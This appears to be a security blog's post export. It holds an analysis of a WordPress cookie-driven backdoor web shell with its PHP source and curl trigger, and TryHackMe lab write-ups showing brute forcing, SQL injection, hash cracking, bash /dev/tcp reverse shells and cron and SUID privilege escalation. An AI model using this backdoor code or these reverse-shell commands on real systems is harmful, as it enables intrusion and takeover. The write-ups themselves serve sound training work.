remaining two cookie values and the three computed function names to generate a final function name. That final function is then executed with no parameters.What are these functions being specified in the cookie values? How do they work together to create a reverse shell? It would be great if we had some logs of an active attack so we could see the payloads used…but we don’t. So let’s see if we can figure it out ourselves.I assumed the shell author needed three things: support for special characters (base64_decode), execution of shell commands (shell_exec), and printing the command output (echo). There was one problem with my assumptions: the functions for those three things all use one parameter. On line four above, you can see the iv function takes two.After scouring the PHP documentation, I came across the create_function function. There’s a big warning in the documentation that it’s been deprecated as of PHP 7.2.0, but it seemed to work on my local 7.4 version so I gave it a shot anyway. The create_function function takes two arguments: a string of arguments, and a string of PHP code. It then creates an anonymous (lambda-style) function that can be executed.Now that we have a set of functions to work with that fit the required number of parameters, let’s see which ones we can overlay on the web shell code so it makes sense.01 $qr = \"base64_decode\";02 $iv = $qr(base64_encode(\"create_function\"));03 $_iv = $qr(base64_encode(\"base64_decode\"));04 $_iv = @$iv($g[10], $_iv($qr($g[53])));05 @$_iv();If we assume the cookie value $g[33] will be the string base64_decode, the values for $iv and $_iv will need to be base64 encoded so they decode to valid function names. Let’s rewrite line four and replace the variable names with their actual values. If you’re wondering why there’s an @ symbol in front of $_iv, it instructs PHP to suppress errors. Which, if you’re an attacker, you’d like to keep hidden from your target.$_iv = @create_function($g[10], base64_decode(base64_decode($g[53])));The variable $_iv is reused here. We set it to base64_decode on line three. It is used in line four to compute a new value for itself. And then that computed value is called on line five.We’ve almost got it! We just need to fill in those create_function arguments with cookie values that fit our algorithm.$_iv = @create_function(\"\", base64_decode(base64_decode(\"WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=\")));An empty string indicating no parameters and a double encoded string will do it. The double encoded string can be any PHP code you want to execute. In this example, I’m printing the current working directory.echo shell_exec('pwd');Let’s go back to our separate statement rewrite of the original code and decorate it with the cookie values we’ve planned out. This should help illustrate the final HTTP request we need to send.// \"base64_decode\" . \"\"$qr = $g[33] . $g[32];// b64(\"create_function\") . \"\"$iv = $qr($g[78] . $g[18]);// b64(\"base64_decode\") . \"\"$_iv = $qr($g[12] . $g[17]);// \"\" b64(b64(\"your PHP payload\"))$_iv = @$iv($g[10], $_iv($qr($g[53])));@$_iv();This makes writing a curl command much easier.curl -v -A \"wp_is_mobile\" --cookie \"33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=\" http://localhost:8000/wp-includes/vars.php --output -Hack YourselfRunning a test on your local system is quite simple; especially with the addition of a built-in web server in PHP versions 5.4 and later.First, create a simple PHP file called index.php containing the backdoor web shell.&lt;?phpfunction wp_is_mobile_fix() { $is_wp_mobile = ($_SERVER['HTTP_USER_AGENT'] == 'wp_is_mobile'); $g = $_COOKIE; (count($g) == 8 &amp;&amp; $is_wp_mobile) ? (($qr = $g[33].$g[32]) &amp;&amp; ($iv = $qr($g[78].$g[18])) &amp;&amp; ($_iv = $qr($g[12].$g[17])) &amp;&amp; ($_iv = @$iv($g[10], $_iv($qr($g[53])))) &amp;&amp; @$_iv()) : $g; return $is_wp_mobile;}wp_is_mobile_fix();?&gt;Then start a simple PHP web server from the command line.$ cd path/to/index.php$ php -S 127.0.0.1:8000Use curl to send your payload with the correct user agent string and cookie values.curl -v -A \"wp_is_mobile\" --cookie \"33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=\" http://localhost:8000/index.php --output -You should see the current working directory of your index.php script in the output.$ curl -v -A \"wp_is_mobile\" --cookie \"33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=\" http://localhost:8000/index.php --output -* Trying ::1:8000...* connect to ::1 port 8000 failed: Connection refused* Trying 127.0.0.1:8000...* Connected to localhost (127.0.0.1) port 8000 (#0)&gt; GET /index.php HTTP/1.1&gt; Host: localhost:8000&gt; User-Agent: wp_is_mobile&gt; Accept: */*&gt; Cookie: 33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 200 OK&lt; Host: localhost:8000&lt; Date: Wed, 26 Jan 2022 16:07:00 GMT&lt; Connection: close&lt; X-Powered-By: PHP/7.4.25&lt; Content-type: text/html; charset=UTF-8&lt; /tmp* Closing connection 0$ More public information on the vulnerability can be found with the associated CVE: CVE-2021-24867." }, { "title": "Mr Robot CTF - TryHackMe", "url": "/posts/mrrobot/", "categories": "tryhackme, writeup", "tags": "medium", "date": "2022-01-19 22:45:00 -0500", "snippet": "Mr Robot CTF has been the most frustrating I’ve encountered so far; and not for reasons of difficulty. There are two brute force tasks that must be completed to obtain credentials, and the TryHackM...", "content": "Mr Robot CTF has been the most frustrating I’ve encountered so far; and not for reasons of difficulty. There are two brute force tasks that must be completed to obtain credentials, and the TryHackMe throttling I experienced makes this unbearably slow. If you’re going to attempt this box, I’d recommend watching the walkthrough and grabbing the credentials from there or just skipping this box entirely. Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.Initial EnumerationAs always, we’ll start with an nmap scan to find a quick starting point.$ sudo nmap -T4 -A mrrobotStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-31 21:09 ESTNmap scan report for mrrobotHost is up (0.11s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp closed ssh80/tcp open http Apache httpd|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache443/tcp open ssl/http Apache httpd| ssl-cert: Subject: commonName=www.example.com| Not valid before: 2015-09-16T10:45:03|_Not valid after: 2025-09-13T10:45:03|_http-server-header: Apache|_http-title: Site doesn't have a title (text/html).Device type: general purpose|specialized|storage-misc|WAP|printerRunning (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 5.4 (90%), Crestron XPanel control system (89%), Linux 3.12 (89%)No exact OS matches for host (test conditions non-ideal).Network Distance: 4 hopsOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 58.58 secondsWeb services are always an easy place to start. If we view it in the browser, there’s an interesting series of animations that happen before presenting an in-browser terminal.Each command plays a video or displays some fsociety posts. If we examine the responses in Burp, there are a couple of 404 responses that have actual page content. Apparently this is all running on top of a Wordpress instance.Let’s use wpscan to probe for vulnerabilities. I’ll spare you the output listing because there’s not much useful in the results. The scan finds a robots.txt file and discovers XML-RPC is enabled. I also ran a user enumeration scan, but since there aren’t any posts it can’t find any users.First KeyStarting with robots.txt, we discover it leaks the first key location!User-agent: *fsocity.dickey-1-of-3.txthttp://mrrobot/robots.txtREDACTEDhttp://mrrobot/key-1-of-3.txtThe fsocity.dic file seems to be a dictionary file which may be useful later. We’ll download a copy for now. Next, we’ll mess with the administrator login page a little.Brute Forcing Wordpress CredentialsThat’s interesting. The error message is telling us we used an invalid username. This means we can most likely brute force a valid one. SecLists has some great username lists we can try. We just need to feed the list to hydra.$ hydra -v -L /usr/share/seclists/Usernames/Names/names.txt -p password -S mrrobot http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:Invalid username.\"Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 09:53:31[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task[DATA] attacking http-post-forms://mrrobot:443/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:Invalid username.[VERBOSE] Resolving addresses ... [VERBOSE] resolving done[STATUS] 840.00 tries/min, 840 tries in 00:01h, 9337 to do in 00:12h, 16 active[STATUS] 599.00 tries/min, 1797 tries in 00:03h, 8380 to do in 00:14h, 16 active[STATUS] 313.14 tries/min, 2192 tries in 00:07h, 7985 to do in 00:26h, 16 active[443][http-post-form] host: mrrobot login: elliot password: password[ERROR] Received signal 2, going down ...The session file ./hydra.restore was written. Type \"hydra -R\" to resume session.After about seven minutes, hydra receives a response without the “Invalid username.” text and the username used was “elliot”. Now we can try brute forcing elliot’s password with the dictionary file we downloaded earlier.$ hydra -R -v -l elliot -P fsocity.dic -S mrrobot http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:The password you entered for the username\"Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).[INFORMATION] reading restore file ./hydra.restore[WARNING] options after -R are now honored (since v8.6)Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 11:56:14[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task[DATA] attacking http-post-forms://mrrobot:443/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:The password you entered for the username[VERBOSE] Resolving addresses ... [VERBOSE] resolving done[STATUS] 9674.00 tries/min, 9674 tries in 00:01h, 848561 to do in 01:28h, 16 active[STATUS] 3278.00 tries/min, 9834 tries in 00:03h, 848401 to do in 04:19h, 16 active[STATUS] 1456.57 tries/min, 10196 tries in 00:07h, 848039 to do in 09:43h, 16 active[STATUS] 726.13 tries/min, 10892 tries in 00:15h, 847343 to do in 19:27h, 16 active[STATUS] 396.39 tries/min, 12288 tries in 00:31h, 845947 to do in 35:35h, 16 active[STATUS] 292.02 tries/min, 13725 tries in 00:47h, 844510 to do in 48:12h, 16 active[STATUS] 240.59 tries/min, 15157 tries in 01:03h, 843078 to do in 58:25h, 16 activeYou may notice the output listing above is incomplete. After three hours of getting throttled, restarting the box, and resuming my hydra session, I gave up and just grabbed the correct password from the walkthrough video.Opening a Reverse ShellOnce logged into the admin dashboard, we can modify the current theme’s PHP code to be a reverse shell. You just need to navigate to Appearance &gt; Editor and then select the 404 template.I like pentestmonkey’s php-reverse-shell. Just modify the destination IP address and port, copy, paste, and save. Make sure you have a listener running and then hit a page that doesn’t exist, or the 404 page directly. (e.g. http://mrrobot/404.php)If everything worked, you should now have a shiny new daemon shell!$ nc -nvlp 4444listening on [any] 4444 ...connect to [10.0.0.1] from (UNKNOWN) [mrrobot] 40535Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 18:11:52 up 1:20, 0 users, load average: 0.00, 0.85, 3.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=1(daemon) gid=1(daemon) groups=1(daemon)/bin/sh: 0: can't access tty; job control turned off$ whoamidaemon$ Cracking robot’s PasswordI like to check the home directory first. Sure enough, there’s a directory for the “robot” user; and it has the second key! Unfortunatley it’s only readable by that user, but there appears to be an MD5 hash of password.$ cd /home/robot$ lskey-2-of-3.txtpassword.raw-md5$ ls -altotal 16drwxr-xr-x 2 root root 4096 Nov 13 2015 .drwxr-xr-x 3 root root 4096 Nov 13 2015 ..-r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt-rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5$ cat password.raw-md5robot:c3fcd3d76192e4007dfb496cca67e13b$ We can use hashcat to try and crack the hash.$ hashcat -m0 -a0 ./hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashcat (v6.1.1) starting......c3fcd3d76192e4007dfb496cca67e13b:REDACTEDSession..........: hashcatStatus...........: CrackedHash.Name........: MD5Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b...Becoming robotIt doesn’t take long. We can’t SSH in since the port is closed, so we’ll have to su a new shell as that user. We can’t do that until we upgrade our shell, and I like to use Python.$ python -c 'import pty; pty.spawn(\"/bin/bash\")'daemon@linux:/home/robot$ su -lc /bin/bash robotsu -lc /bin/bash robotPassword: bash: cannot set terminal process group (-1): Inappropriate ioctl for devicebash: no job control in this shellrobot@linux:~$ Second KeyNow we can read the file.robot@linux:~$ cat key-2-of-3.txtcat key-2-of-3.txtREDACTEDrobot@linux:~$ Privilege EscalationOn to privilege escalation. Let’s search for SUID bit files.robot@linux:~$ find / -perm /4000 2&gt;/dev/nullfind / -perm /4000 2&gt;/dev/null/bin/ping/bin/umount/bin/mount/bin/ping6/bin/su/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/local/bin/nmap/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper/usr/lib/pt_chownrobot@linux:~$ gtfobins says we can get a shell by running nmap in interactive mode and then dropping into a shell. Let’s try it.robot@linux:~$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!shsh: 0: can't access tty; job control turned off# whoamiwhoamiroot# Third KeyIt works! Last thing to do is get that third key sitting in the /root directory.# cd /rootcd /root# ls -alls -altotal 32drwx------ 3 root root 4096 Nov 13 2015 .drwxr-xr-x 22 root root 4096 Sep 16 2015 ..-rw------- 1 root root 4058 Nov 14 2015 .bash_history-rw-r--r-- 1 root root 3274 Sep 16 2015 .bashrcdrwx------ 2 root root 4096 Nov 13 2015 .cache-rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done-r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt-rw-r--r-- 1 root root 140 Feb 20 2014 .profile-rw------- 1 root root 1024 Sep 16 2015 .rnd# cat key-3-of-3.txtcat key-3-of-3.txtREDACTED# " }, { "title": "Minotaur's Labyrinth - TryHackMe", "url": "/posts/minotaur/", "categories": "tryhackme, writeup", "tags": "medium", "date": "2022-01-14 13:39:00 -0500", "snippet": "Minotaur’s Labyrinth is another vulnerable web application with a built-in web shell for gaining user access. The labyrinth theme keeps things interesting and you have to find a privileged user by ...", "content": "Minotaur’s Labyrinth is another vulnerable web application with a built-in web shell for gaining user access. The labyrinth theme keeps things interesting and you have to find a privileged user by cracking some passwords before you can access the web shell. There are also a pair of flags hidden along the way which give this box a CTF feel. Overall, it was enjoyable challenge. Let’s get started on how to solve it. Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.Initial EnumerationAs always, we start with a port scan.$ sudo nmap -T4 -A minotaurStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 13:39 ESTNmap scan report for minotaurHost is up (0.16s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp ProFTPD| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxr-xr-x 3 nobody nogroup 4096 Jun 15 2021 pub80/tcp open http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)| http-title: Login|_Requested resource was login.html|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1443/tcp open ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)|_http-title: Bad request!| tls-alpn: |_ http/1.1|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE| Not valid before: 2004-10-01T09:10:30|_Not valid after: 2010-09-30T09:10:30No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/14%OT=80%CT=1%CU=39334%PV=Y%DS=4%DC=T%G=Y%TM=61E1C37OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPSOS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1OS:1NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECNOS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(ROS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%FOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CDOS:=S)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 52.88 secondsFirst FlagFTP is open and nmap’s ftp-anon script indicates anonymous logins are allowed. Let’s start there. FTP to minotaur with the username anonymous and no password.$ ftp minotaurConnected to minotaur.220 ProFTPD Server (ProFTPD) [::ffff:10.10.88.99]Name (minotaur:dnstun0): anonymous331 Anonymous login ok, send your complete email address as your passwordPassword:230 Anonymous access granted, restrictions applyRemote system type is UNIX.Using binary mode to transfer files.ftp&gt; Once we are logged in, there is a pub directory available. Be sure to use ls -al to list files so you can see the .secret directory inside pub.ftp&gt; ls -al200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x 3 root root 4096 Jun 15 2021 .drwxr-xr-x 3 root root 4096 Jun 15 2021 ..drwxr-xr-x 3 nobody nogroup 4096 Jun 15 2021 pub226 Transfer completeftp&gt; cd pub250 CWD command successfulftp&gt; ls -al200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x 3 nobody nogroup 4096 Jun 15 2021 .drwxr-xr-x 3 root root 4096 Jun 15 2021 ..drwxr-xr-x 2 root root 4096 Jun 15 2021 .secret-rw-r--r-- 1 root root 141 Jun 15 2021 message.txt226 Transfer completeftp&gt; Inside the .secret folder is the flag! Use the get command to download it.ftp&gt; cd .secret250 CWD command successfulftp&gt; ls -al200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x 2 root root 4096 Jun 15 2021 .drwxr-xr-x 3 nobody nogroup 4096 Jun 15 2021 ..-rw-r--r-- 1 root root 30 Jun 15 2021 flag.txt-rw-r--r-- 1 root root 114 Jun 15 2021 keep_in_mind.txt226 Transfer completeftp&gt; get flag.txtlocal: flag.txt remote: flag.txt200 PORT command successful150 Opening BINARY mode data connection for flag.txt (30 bytes)226 Transfer complete30 bytes received in 0.00 secs (70.4252 kB/s)ftp&gt; quit221 Goodbye.$ cat flag.txtREDACTEDLeaked CredentialsHTTP and HTTPS are also open. Let’s see what the browser renders.It’s a simple login page. We could try brute forcing it, but lets see if there are any other publicly accessible pages.I had some horrible network latency again with TryHackMe’s VPN. I eventually got feroxbuster to show me a logs directory. Apache is configured to display the directory contents, so we can easily traverse to a log file:http://minotaur/logs/post/post_log.logPOST /minotaur/minotaur-box/login.php HTTP/1.1Host: 127.0.0.1Content-Length: 36sec-ch-ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"Accept: */*Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36sec-ch-ua-platform: \"Windows\"Origin: http://127.0.0.1Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1/minotaur/minotaur-box/login.htmlAccept-Encoding: gzip, deflateAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhvConnection: closeemail=Daedalus&amp;password=REDACTEDIt’s a captured HTTP request with a username and password. Trying the credentials successfully logs us into the site.Dumping and Cracking HashesThere’s a search form that lets us query People or Creatures. Trying a typical SQL injection payload works immediately and gets us a complete list of users and password hashes.Let’s use hashcat and the rockyou password list to see if we can crack any of them.hashcat -m0 -a0 people /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txthashcat (v6.1.1) starting......42354020b68c7ed28dcdeabd5a2baf8e:REDACTED0b3bebe266a81fbfaa79db1604c4e67f:REDACTEDb83f966a6f5a9cff9c6e1c52b0aa635b:REDACTED1765db9457f496a39859209ee81fbda4:REDACTEDApproaching final keyspace - workload adjusted.Session..........: hashcatStatus...........: Exhausted Hash.Name........: MD5 Hash.Target......: people...Four out of five isn’t bad! And the one we didn’t crack was the one we found in the log file anyway.Let’s change the query table to Creatures and run our SQLi payload again; four more hashes are appended to the page. Let’s crack those too.hashcat -m0 -a0 creatures /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txthashcat (v6.1.1) starting......3898e56bf6fa6ddfc3c0977c514a65a8:REDACTED5d20441c392b68c61592b2159990abfe:REDACTEDf847149233ae29ec0e1fcf052930c044:REDACTEDea5540126c33fe653bf56e7a686b1770:REDACTEDSession..........: hashcatStatus...........: CrackedHash.Name........: MD5Hash.Target......: creatures...Second FlagWith all of the hashes cracked, we can authenticate as each user and see if any of them have elevated privileges. Sure enough, when we log in as M!notaur there’s a flag in the menu and an extra link to “Secret_Stuff”.Exploiting the Echo PanelThe “Secret_Stuff” page is just an “echo” tool. Whatever you type into the form gets echoed onto the page. It appears there is a filter because some commands and characters print a sort of error message to the page instead of the submitted value:You really think this is gonna be possible i fixed this @Deadalus -_- !!!?Fortunately one crucial character is not restricted and we can execute commands by enclosing them in backticks (```). Using the cat command, we can see the filter being applied in echo.php.preg_match('/[#!@%^&amp;*()$_=\\[\\]\\';,{}:&gt;?~\\\\\\\\]/', $search)This makes crafting a bypass much easier than guessing. We can create a bash reverse shell by base64 encoding it.base64 -d &lt;&lt;&lt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEg | /bin/bashBe sure to add spaces to your reverse shell command until the encoded output has no trailing =; since it’s a restricted character. Set up a listener and then submit the payload (wrapped in backticks) and we should have a successful reverse shell.$ nc -nvlp 4444listening on [any] 4444 ...connect to [10.6.125.202] from (UNKNOWN) [10.10.240.244] 44298bash: cannot set terminal process group (744): Inappropriate ioctl for devicebash: no job control in this shellbash: /root/.bashrc: Permission denieddaemon@labyrinth:/opt/lampp/htdocs$ User flagFinding the user flag is straightforward. It’s in the “user” home directory which is accessible to the daemon user that we’ve just obtained access as.daemon@labyrinth:/opt/lampp/htdocs$ cd /homecd /homedaemon@labyrinth:/home$ ls -alls -altotal 20drwxr-xr-x 5 root root 4096 jún 18 2021 .drwxr-xr-x 26 root root 4096 nov 9 13:37 ..drwxr-xr-x 2 anonftp anonftp 4096 jún 18 2021 anonftpdrwxr-xr-x 18 minotaur minotaur 4096 nov 9 13:35 minotaurdrwxr-xr-x 2 daemon daemon 4096 jún 15 2021 userdaemon@labyrinth:/home$ cd usercd userdaemon@labyrinth:/home/user$ ls -alls -altotal 12drwxr-xr-x 2 daemon daemon 4096 jún 15 2021 .drwxr-xr-x 5 root root 4096 jún 18 2021 ..-rw-r--r-- 1 daemon daemon 29 jún 15 2021 flag.txtdaemon@labyrinth:/home/user$ cat flag.txtcat flag.txtREDACTEDOn to the root flag.Root flagListing everything under the root mount, you can see there’s an unusual directory called timers.daemon@labyrinth:/$ ls -alls -altotal 728648drwxr-xr-x 26 root root 4096 nov 9 13:37 .drwxr-xr-x 26 root root 4096 nov 9 13:37 ..drwxr-xr-x 2 root root 4096 szept 20 08:41 bindrwxr-xr-x 3 root root 4096 nov 9 13:38 bootdrwxrwxr-x 2 root root 4096 jún 15 2021 cdromdrwxr-xr-x 17 root root 4100 jan 15 02:48 devdrwxr-xr-x 126 root root 12288 nov 10 11:19 etcdrwxr-xr-x 5 root root 4096 jún 18 2021 homelrwxrwxrwx 1 root root 32 nov 9 13:37 initrd.img -&gt; boot/initrd.img-5.4.0-90-genericlrwxrwxrwx 1 root root 32 nov 9 13:37 initrd.img.old -&gt; boot/initrd.img-5.4.0-89-genericdrwxr-xr-x 21 root root 4096 jún 15 2021 libdrwxr-xr-x 2 root root 4096 szept 20 11:17 lib64drwx------ 2 root root 16384 jún 15 2021 lost+founddrwxr-xr-x 2 root root 4096 aug 7 2020 mediadrwxr-xr-x 2 root root 4096 aug 7 2020 mntdrwxr-xr-x 3 root root 4096 jún 15 2021 optdr-xr-xr-x 248 root root 0 jan 15 02:46 procdrwxr-xr-x 2 root root 4096 jún 15 2021 remindersdrwx------ 7 root root 4096 jún 15 2021 rootdrwxr-xr-x 29 root root 940 jan 15 03:21 rundrwxr-xr-x 2 root root 12288 szept 20 08:41 sbindrwxr-xr-x 14 root root 4096 szept 23 11:43 snapdrwxr-xr-x 2 root root 4096 jún 16 2021 srv-rw------- 1 root root 746009600 jún 15 2021 swapfiledr-xr-xr-x 13 root root 0 jan 15 02:46 sysdrwxrwxrwx 2 root root 4096 jún 15 2021 timersdrwxrwxrwt 13 root root 4096 jan 15 03:45 tmpdrwxr-xr-x 11 root root 4096 aug 7 2020 usrdrwxr-xr-x 16 root root 4096 jún 15 2021 varlrwxrwxrwx 1 root root 29 nov 9 13:37 vmlinuz -&gt; boot/vmlinuz-5.4.0-90-genericlrwxrwxrwx 1 root root 29 nov 9 13:37 vmlinuz.old -&gt; boot/vmlinuz-5.4.0-89-genericdaemon@labyrinth:/$ Inside we find a timer shell script with 777 file permissions.daemon@labyrinth:/$ cd timersdaemon@labyrinth:/timers$ ls -altotal 12drwxrwxrwx 2 root root 4096 jún 15 2021 .drwxr-xr-x 26 root root 4096 nov 9 13:37 ..-rwxrwxrwx 1 root root 70 jún 15 2021 timer.shIt’s a simple script that echoes some text to a file. I suspect this script is executed by a root cron job. Let’s set up a second netcat listener on port 4445 and add a reverse shell command to the script.$ nc -nvlp 4445listening on [any] 4445 ...daemon@labyrinth:/timers$ cat timer.shcat timer.sh#!/bin/bashecho \"dont fo...forge...ttt\" &gt;&gt; /reminders/dontforget.txtdaemon@labyrinth:/timers$ daemon@labyrinth:/timers$ echo \"/bin/bash -i &gt;&amp; /dev/tcp/10.6.125.202/4445 0&gt;&amp;1\" &gt;&gt; timer.shAfter about a minute, the shell connects and we have root access!$ nc -nvlp 4445listening on [any] 4445 ...connect to [10.6.125.202] from (UNKNOWN) [10.10.88.99] 52728/bin/sh: 0: can't access tty; job control turned off# whoamirootThe last thing to do is collect the flag.# cat da_king_flek.txtREDACTED" }, { "title": "Pickle Rick - TryHackMe", "url": "/posts/picklerick/", "categories": "tryhackme, writeup", "tags": "easy", "date": "2021-12-31 13:44:00 -0500", "snippet": "Pickle Rick was a fun Rick and Morty themed CTF box from TryHackMe. As you make your way through the system, you collect text files containing ingredients to turn Rick back into a human. There are ...", "content": "Pickle Rick was a fun Rick and Morty themed CTF box from TryHackMe. As you make your way through the system, you collect text files containing ingredients to turn Rick back into a human. There are three files; two of which are accessible to the www-data user. To read the third file, you must be root. You can gain initial access just by following a typical web enumeration methodology. Once inside the admin portal, there’s a built-in web shell with some rudimentary restrictions that can be easily bypassed. Getting a shell is trivial and then the www-data user has NOPASSWD sudo privileges for instant root access. Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.Initial EnumerationI started my enumeration with a quick port scan.$ nmap -T4 -A picklerickStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 21:27 ESTNmap scan report for picklerickHost is up (0.12s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ec:7c:a4:c1:18:64:aa:b7:8f:3f:bd:99:8c:c4:a1:07 (RSA)| 256 05:a7:9f:d3:5f:0a:86:ba:16:a7:1a:be:1d:75:4e:b9 (ECDSA)|_ 256 a2:20:e4:a1:66:79:c5:6a:f3:82:b0:60:86:a6:55:58 (ED25519)80/tcp open http Apache httpd 2.4.18 